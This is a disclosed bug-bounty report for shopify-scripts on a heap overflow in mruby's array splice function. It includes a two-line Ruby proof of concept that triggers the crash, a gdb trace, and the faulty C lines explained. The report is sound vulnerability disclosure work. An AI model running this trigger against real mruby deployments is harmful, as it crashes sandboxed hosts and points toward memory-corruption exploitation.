# Heap Overflow in mrb_arb_splice

## Report Details
- **Report ID**: 192362
- **URL**: https://hackerone.com/reports/192362
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-19T08:57:01.719Z
- **Disclosed**: 2017-01-12T03:09:25.728Z

## Reporter
- **Username**: tunz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
It's similar with #192235, but the root cause is different.

both of mruby and mruby-engine are crashed by the following PoC. (MRB_INT64)
```ruby
ary = Array.new(1023)
ary[0x7ffffffffffffc00,0] = Array.new(1024)
```

```
$ gdb -q --args ./bin/mruby test2.rb
Reading symbols from ./bin/mruby...done.
(gdb) r
Starting program: /home/tunz/working/mruby/mruby/bin/mruby test2.rb

Program received signal SIGSEGV, Segmentation fault.
0x00000000004147fe in ary_fill_with_nil (ptr=0xe5c010, size=9223372036854765337) at /home/tunz/working/mruby/mruby/src/array.c:104
104         *ptr++ = nil;
(gdb) list
99      ary_fill_with_nil(mrb_value *ptr, mrb_int size)
100     {
101       mrb_value nil = mrb_nil_value();
102
103       while (size--) {
104         *ptr++ = nil;
105       }
106     }
107
108     static void
(gdb) bt
#0  0x00000000004147fe in ary_fill_with_nil (ptr=0xe5c010, size=9223372036854765337) at /home/tunz/working/mruby/mruby/src/array.c:104
#1  0x0000000000415fd1 in mrb_ary_splice (mrb=0xdd7010, ary=..., head=9223372036854774784, len=-9223372036854773761, rpl=...)
    at /home/tunz/working/mruby/mruby/src/array.c:626
#2  0x00000000004165be in mrb_ary_aset (mrb=0xdd7010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:808
#3  0x0000000000430c09 in mrb_vm_exec (mrb=0xdd7010, proc=0xdda210, pc=0xe3f03c) at /home/tunz/working/mruby/mruby/src/vm.c:1171
#4  0x000000000042f121 in mrb_vm_run (mrb=0xdd7010, proc=0xdda210, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:772
#5  0x0000000000437199 in mrb_top_run (mrb=0xdd7010, proc=0xdda210, self=..., stack_keep=0)
    at /home/tunz/working/mruby/mruby/src/vm.c:2487
#6  0x0000000000447847 in mrb_load_exec (mrb=0xdd7010, p=0xe332d0, c=0xe31f40)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755
#7  0x00000000004478dd in mrb_load_file_cxt (mrb=0xdd7010, f=0xe32f10, c=0xe31f40)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764
#8  0x00000000004024fc in main (argc=2, argv=0x7ffff40a93e8)
    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232
(gdb) x/i $pc
=> 0x4147fe <ary_fill_with_nil+51>:     mov    QWORD PTR [rcx],rax
(gdb) i r rcx
rcx            0xe5c000 15056896
```

I think the following lines are the problem in src/array.c:
```C
 581 MRB_API mrb_value
 582 mrb_ary_splice(mrb_state *mrb, mrb_value ary, mrb_int head, mrb_int len, mrb_value rpl)
 583 {
...
 619   size = head + argc; // size is calculated here, and can be overflow
 620
 621   if (tail < a->len) size += a->len - tail;
 622   if (size > a->aux.capa) // then, bypass this condition
 623     ary_expand_capa(mrb, a, size);
 624
 625   if (head > a->len) {
 626     ary_fill_with_nil(a->ptr + a->len, head - a->len); // heap overflow since capa is still small. 
 627   }
...
```

## Attachments
No attachments
